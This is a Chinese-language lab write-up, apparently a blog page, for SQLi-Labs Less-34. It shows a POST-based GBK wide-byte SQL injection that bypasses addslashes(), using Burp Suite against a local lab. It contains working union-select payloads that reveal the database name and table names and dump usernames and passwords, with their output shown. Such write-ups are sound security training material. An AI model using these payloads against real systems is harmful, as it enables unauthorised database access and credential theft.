@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-34 POST型宽字节注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-34 POST型宽字节注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.27 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, POST注入, 宽字节注入, Burp Suite</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-34 (POST - Bypass addslashes)</li>
+        <li><strong>提示：</strong>POST 登录框，后端使用 <code>addslashes()</code> 转义，数据库连接使用 GBK 编码。</li>
+    </ul>
+
+    <h2>2. 工具配置与操作环境</h2>
+    <p>本关卡为 POST 请求，需拦截并修改 HTTP 请求体，继续使用 <b>Burp Suite</b>。</p>
+    <ul>
+        <li><strong>浏览器代理：</strong>设置代理为 <code>127.0.0.1:8080</code>。</li>
+        <li><strong>操作模块：</strong>使用 Burp 的 <b>Proxy (代理)</b> 模块拦截请求，发送至 <b>Repeater (重放器)</b> 进行调试。</li>
+    </ul>
+
+    <h2>3. 核心原理：POST 环境下的宽字节注入</h2>
+    <p>本关卡的核心防御机制是 <code>addslashes()</code>，它会在单引号 <code>'</code>（十六进制 <code>0x27</code>）前加上反斜杠 <code>\</code>（十六进制 <code>0x5C</code>）。正常输入会导致单引号被转义为 <code>\'</code>，无法闭合语句。</p>
+    <p><strong>宽字节绕过机制：</strong></p>
+    <ol>
+        <li>由于数据库采用了 GBK 双字节编码，在底层解析时，会将两个连续的字节（范围符合 GBK 规则）组合成一个汉字。</li>
+        <li>在 <code>uname</code> 字段输入 <code>%df'</code>（十六进制 <code>0xDF 0x27</code>）。</li>
+        <li>后端转义后，字节流变为 <code>0xDF 0x5C 0x27</code>。</li>
+        <li>GBK 解析器将高位字节 <code>0xDF</code> 和转义符 <code>0x5C</code> 组合成了一个合法的汉字（如“運”），从而将反斜杠“吃掉”，导致末尾的单引号 <code>0x27</code> 成功逃逸，闭合了原 SQL 语句。</li>
+    </ol>
+
+    <h2>4. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：抓包与探测</strong></p>
+    <p>在登录页面随意输入账号密码，开启 Burp 拦截，点击登录。将拦截到的 POST 请求发送至 Repeater。</p>
+    <p>在请求体（Body）中，利用联合查询进行探测。因为登录框原查询语句为 <code>SELECT username, password FROM users ...</code>，固定为 <b>2 列</b>，所以 UNION SELECT 后面必须凑齐 2 列。</p>
+    <p><strong>请求体 Payload：</strong></p>
+    <pre><code>uname=-1%df' union select 1,database()-- -&passwd=123&submit=Submit</code></pre>
+    <p><strong>回显现象：</strong>页面渲染出 <code>Your Login name:1</code> 和 <code>Your Password:security</code>。</p>
+    <p><strong>解释与原理：</strong><code>-1%df'</code> 成功闭合了原有的 <code>username='$uname'</code>。由于不存在 id 为 -1 的用户，前置查询结果为空。系统将第 1 列（数字 1）展示在 username 位置，第 2 列（database() 的结果）展示在 password 位置。</p>
+
+    <p><strong>第二步：爆出表名</strong></p>
+    <p><strong>请求体 Payload：</strong></p>
+    <pre><code>uname=-1%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()-- -&passwd=123&submit=Submit</code></pre>
+    <p><strong>回显现象：</strong><code>Your Password:emails,referrers,uagents,users</code>。</p>
+    <p><strong>解释与原理：</strong>将 <code>database()</code> 替换为查询表名的子查询语句。使用 <code>group_concat()</code> 将多行表名合并为一行字符串，放在第 2 列输出。</p>
+
+    <p><strong>第三步：脱库获取账号密码</strong></p>
+    <p><strong>请求体 Payload：</strong></p>
+    <pre><code>uname=-1%df' union select 1,group_concat(username,0x3a,password) from users-- -&passwd=123&submit=Submit</code></pre>
+    <p><strong>回显现象：</strong><code>Your Password:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,admin:p@ssw0rd...</code>。</p>
+    <p><strong>解释与原理：</strong>直接查询 <code>users</code> 表，利用 <code>group_concat</code> 把用户名和密码以冒号（<code>0x3a</code>）拼接输出。虽然在登录框，但不需要正确的密码，利用 UNION 联合查询可以直接将数据库数据作为“密码”打印出来。</p>
+
+    <h2>5. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>原始字节传输</strong>：在 Burp 的 Raw 面板或浏览器地址栏中，必须直接写 <code>%df</code> 代表原始字节。若使用了工具自带的 URL 编码功能，<code>%</code> 会被二次编码为 <code>%25</code>，导致宽字节解析失败，注入失效。</li>
+        <li><strong>列数精准匹配</strong>：本关原查询固定返回 <code>username</code> 和 <code>password</code> 两列。如果 UNION SELECT 写入 3 列会直接报错，必须保持 2 列。</li>
+        <li><strong>注释符使用</strong>：在 POST 请求体中，<code>-- </code> (注意末尾需有空格或换行) 或 <code>#</code> 均可使用，用于注释掉后端 SQL 语句末尾的单引号及 LIMIT 限制。</li>
+    </ul>
+
+    <h2>6. 知识点总结</h2>
+    <ul>
+        <li><strong>POST 宽字节注入</strong>：利用 POST 传参，结合 GBK 字符集双字节特性绕过 <code>addslashes()</code> 等转义函数。</li>
+        <li><strong>基于回显点的 UNION 注入</strong>：深刻理解联合查询必须保证前后字段数一致，且根据页面渲染逻辑，将 Payload 放置在能回显的正确列上。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
